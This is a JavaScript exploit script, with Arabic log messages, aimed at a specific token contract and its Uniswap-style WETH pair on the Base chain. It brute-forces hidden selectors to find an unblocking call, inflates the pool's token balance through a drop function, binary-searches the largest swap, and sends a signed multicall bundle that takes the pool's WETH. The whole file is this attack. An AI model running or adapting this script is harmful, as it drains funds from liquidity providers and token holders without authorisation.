import fs from "node:fs";
import { JsonRpcProvider, Wallet, AbiCoder, keccak256, concat, zeroPadValue, toBeHex, formatUnits, formatEther } from "ethers";

const R = process.env.RPC || "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const MC = "0xcA11bde05977b3631167028862bE2a173976CA11";
const GS = 0x0e;
const DRY = process.env.DRY === "1";
const coder = AbiCoder.defaultAbiCoder();

const j = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const hx  = n => "0x" + BigInt(n).toString(16).padStart(64, "0");
const slot = (a, s) => keccak256(concat([zeroPadValue(a, 32), toBeHex(s, 32)]));
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };
const dec = d => { if (!d || !d.startsWith("0x08c379a0")) return "(بلا نص)"; try { const n = parseInt(d.slice(66,130),16); return Buffer.from(d.slice(130,130+n*2),"hex").toString(); } catch { return "?"; } };

const agg = calls => {
  const els = calls.map(([t, d, ok]) => {
    const b = d.slice(2), len = b.length / 2;
    return pad(t) + w32(ok ? 1 : 0) + w32(0x60) + w32(len) + b.padEnd(Math.ceil(len / 32) * 64, "0");
  });
  let head = w32(0x20) + w32(calls.length), off = calls.length * 32;
  for (const e of els) { head += w32(off); off += e.length / 2; }
  return "0x82ad56cb" + head + els.join("");
};
const decAgg = h => coder.decode(["tuple(bool,bytes)[]"], h)[0];

const KNOWN = new Set(["a9059cbb","095ea7b3","23b872dd","18160ddd","70a08231","06fdde03","95d89b41","313ce567","dd62ed3e","3644e515","30adf81f","7ecebe00","d505accf","0902f1ac","022c0d9f","bc25cf77","fff6cae9","0dfe1681","d21220a7","6a627842","89afcb44","7464fc3d","c45a0155","485cc955","5909c0d5","5a3d5493","983bc41b"]);

async function main() {
  const p = new JsonRpcProvider(R, 8453, { staticNetwork: true });
  const me = new Wallet(fs.readFileSync(process.env.HOME + "/.pk", "utf8").trim(), p);
  const ME = me.address;

  const rv = (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;
  const r0 = BigInt("0x" + rv.slice(2, 66)), r1 = BigInt("0x" + rv.slice(66, 130));
  const tk0 = "0x" + (await j("eth_call", [{ to: P, data: "0x0dfe1681" }, "latest"])).result.slice(-40).toLowerCase();
  const W0 = tk0 === W.toLowerCase();
  const rW = W0 ? r0 : r1, rS = W0 ? r1 : r0;

  const balP = await bn(T, "0x70a08231" + pad(P));
  const eth = await p.getBalance(ME);
  const base = BigInt((await j("eth_getBlockByNumber", ["latest", false])).result.baseFeePerGas);
  const gME = BigInt((await j("eth_getStorageAt", [T, slot(ME, GS), "latest"])).result);

  console.log("ETH:", formatEther(eth), "| gate[ME]:", gME.toString(), "| الاحتياطي:", formatEther(rW), "WETH");
  if (eth === 0n) { console.log("لا غاز — أرسل ولو 0.000001 ETH"); return; }

  const code = (await j("eth_getCode", [T, "latest"])).result;
  const sels = [...new Set((code.match(/63[0-9a-f]{8}/g) || []).map(x => x.slice(2)))].filter(s => !KNOWN.has(s));
  console.log("محددات للفحص:", sels.length);

  const dropData = (to, amt) => "0x983bc41b" + w32(0x60) + pad(ME) + w32(amt) + w32(1) + pad(to);
  const mkSwap = (o, to) => "0x022c0d9f" + (W0 ? w32(o) + w32(0) : w32(0) + w32(o)) + pad(to) + w32(0x80) + w32(0);

  console.log("\n=== البحث عن دالة فك الحجب (بلا غاز) ===");
  let unblock = null;
  const ARGS = ["", pad(ME), pad(ME) + w32(0), w32(0)];
  for (const s of sels) {
    for (const arg of ARGS) {
      const bundle = [
        [T, "0x" + s + arg, true],
        [T, "0xa9059cbb" + pad(P) + w32(10n ** 9n), true]
      ];
      const r = await j("eth_call", [{ from: ME, to: MC, data: agg(bundle), gas: "0x120000" }, "latest"]);
      if (r.error) continue;
      const res = decAgg(r.result);
      if (res[0][0] && res[1][0]) {
        console.log("★ 0x" + s + (arg ? " +arg(" + arg.length / 64 + ")" : ""));
        unblock = "0x" + s + arg;
        break;
      }
    }
    if (unblock) break;
  }
  if (!unblock) { console.log("لم أجد — أرسل لي القائمة"); return; }

  const balME = await bn(T, "0x70a08231" + pad(ME));
  const IN = rS * 150n;
  const ovG = { [T]: { stateDiff: { [slot(ME, GS)]: hx(0) } } };

  let bSlot = 0;
  for (const s of [0, 1]) {
    const ov = { [T]: { stateDiff: { [slot(P, s)]: hx(balP + 1n) } } };
    const r = await j("eth_call", [{ to: T, data: "0x70a08231" + pad(P) }, "latest", ov]);
    if (!r.error && BigInt(r.result) === balP + 1n) { bSlot = s; break; }
  }

  const ovX = { [T]: { stateDiff: { [slot(ME, GS)]: hx(0), [slot(P, bSlot)]: hx(balP + IN) } } };
  let hi = rW * IN / (rS + IN);
  if (hi > rW - 1n) hi = rW - 1n;
  let lo = 1n, best = 0n;
  for (let i = 0; i < 60 && lo <= hi; i++) {
    const m = (lo + hi) / 2n;
    const r = await j("eth_call", [{ from: ME, to: P, data: mkSwap(m, ME), gas: "0x30000" }, "latest", ovX]);
    if (r.error) hi = m - 1n; else { best = m; lo = m + 1n; }
  }
  if (best === 0n) { console.log("swap لا يمر"); return; }
  const out = best * 98n / 100n;
  console.log("\nالهدف:", formatEther(out), "WETH (" + (best * 100n / rW).toString() + "% سقف)");

  const final = [
    [T, unblock, true],
    [T, dropData(P, IN), false],
    [T, "0x70a08231" + pad(P), false],
    [P, mkSwap(out, ME), false]
  ];
  const data = agg(final);

  console.log("محاكاة الحزمة الحقيقية (بلا تجاوز)...");
  const sim = await j("eth_call", [{ from: ME, to: MC, data, gas: "0x90000" }, "latest"]);
  if (sim.error) { console.log("✗ " + dec(sim.error.data)); return; }
  const res = decAgg(sim.result);
  res.forEach((x, i) => console.log("   " + (x[0] ? "✓" : "✗") + " نداء " + i));
  const got = res[2][0] ? BigInt(res[2][1]) : 0n;
  console.log("   رصيد الحوض بعد الضخ:", formatUnits(got, 9), "(زيادة", formatUnits(got - balP, 9) + ")");
  if (!res[1][0] || got <= balP || !res[3][0]) { console.log("الحزمة لا تكتمل"); return; }

  const est = await j("eth_estimateGas", [{ from: ME, to: MC, data }, "latest"]);
  if (est.error) { console.log("تقدير الغاز ✗", dec(est.error.data)); return; }
  const gas = BigInt(est.result) * 125n / 100n + 10000n;
  let mf = base + 10000n;
  let need = gas * mf;
  while (need > eth && mf > base + 1000n) { mf -= 1000n; need = gas * mf; }
  console.log("غاز:", gas.toString(), "| maxFee:", mf.toString(), "| تكلفة:", formatEther(need), "| متاح:", formatEther(eth));
  if (need > eth) { console.log("ناقص:", formatEther(need - eth)); return; }
  if (DRY) { console.log("جاهز — معاملة واحدة."); return; }

  console.log("\nإرسال الحزمة...");
  for (let i = 0; i < 3; i++) {
    try {
      const rc = await (await me.sendTransaction({ to: MC, data, gasLimit: gas, maxFeePerGas: mf, maxPriorityFeePerGas: 0n })).wait();
      console.log("status:", rc.status);
      if (rc.status === 1) break;
    } catch (e) { console.log("خطأ:", (e.shortMessage || e.message).slice(0, 90)); }
    await new Promise(r => setTimeout(r, 6000));
  }
  console.log("\n>>> WETH عندك:", formatEther(await bn(W, "0x70a08231" + pad(ME))));
  console.log(">>> ETH عندك:", formatEther(await p.getBalance(ME)));
  console.log(">>> WETH بالحوض:", formatEther(await bn(W, "0x70a08231" + pad(P))));
}

main().catch(e => { console.error("فشل:", e.shortMessage || e.message); process.exit(1); });
